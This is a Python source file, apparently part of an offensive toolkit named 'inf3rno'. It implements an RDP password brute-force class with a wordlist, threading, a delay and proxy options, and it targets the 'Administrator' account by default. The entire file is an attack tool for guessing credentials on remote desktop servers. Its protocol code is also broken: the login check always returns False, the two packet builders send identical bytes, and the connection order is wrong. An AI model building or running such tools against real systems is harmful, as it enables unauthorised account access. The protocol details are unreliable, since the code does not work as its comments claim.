"""RDP brute-force module."""

import socket
import ssl
from inf3rno.core.bruteforce import BaseBrute


class RDPBrute(BaseBrute):
    """RDP brute-force implementation."""

    def __init__(self, target: str, port: int = 3389, username: str = "Administrator",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "RDP"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt RDP login using NLA (Network Level Authentication)."""
        try:
            # Create TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))

            # Receive server data (X.224 Connection Confirm)
            data = sock.recv(1024)

            if not data:
                sock.close()
                return False

            # Send X.224 Connection Request
            cr = self._build_connection_request()
            sock.send(cr)

            # Receive X.224 Connection Confirm
            data = sock.recv(1024)

            # Send Negotiation Request (SSL)
            neg_req = self._build_negotiation_request()
            sock.send(neg_req)

            # Receive Negotiation Response
            data = sock.recv(4096)

            # Try SSL/TLS connection
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
                ssl_sock.close()
                sock.close()

                # If we get here, port is open but we need proper RDP client
                # For now, check if port responds
                return False

            except ssl.SSLCertVerificationError:
                sock.close()
                return False
            except Exception:
                sock.close()
                return False

        except socket.timeout:
            if self.verbose:
                print(f"[!] Connection timeout for {username}:{password}")
            return False
        except ConnectionRefusedError:
            if self.verbose:
                print(f"[!] Connection refused for {username}:{password}")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] RDP error for {username}:{password}: {e}")
            return False

    def _build_connection_request(self):
        """Build X.224 Connection Request packet."""
        # Simplified RDP Connection Request
        x224_cr = bytes([
            0x03, 0x00, 0x00, 0x13,  # TPKT header
            0x0e, 0xe0, 0x00, 0x00,  # X.224 CR
            0x00, 0x00, 0x00, 0x01,
            0x00, 0x08, 0x00, 0x03,
            0x00, 0x00, 0x00,
        ])
        return x224_cr

    def _build_negotiation_request(self):
        """Build Negotiation Request packet."""
        # Simplified Negotiation Request
        neg_req = bytes([
            0x03, 0x00, 0x00, 0x13,  # TPKT header
            0x0e, 0xe0, 0x00, 0x00,  # X.224 Data
            0x00, 0x00, 0x00, 0x01,
            0x00, 0x08, 0x00, 0x03,
            0x00, 0x00, 0x00,
        ])
        return neg_req
